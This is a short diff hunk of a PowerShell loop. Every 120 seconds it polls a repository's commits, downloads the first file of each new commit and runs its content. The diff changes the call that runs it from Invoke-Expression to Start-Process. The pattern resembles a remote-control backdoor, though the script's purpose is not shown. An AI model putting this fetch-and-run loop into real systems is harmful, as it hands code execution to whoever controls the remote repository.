@@ -23,7 +23,7 @@ while ($true){
         $contents = Invoke-RestMethod -Uri ($url + "/" + $commit.sha.ToString())
         $file =  $contents.files[0]
         $file_content = Invoke-WebRequest -Uri $file.raw_url
-        Invoke-Expression $file_content
+        Start-Process $file_content
         $message | Add-Content -Path $current
     }
     Start-Sleep 120
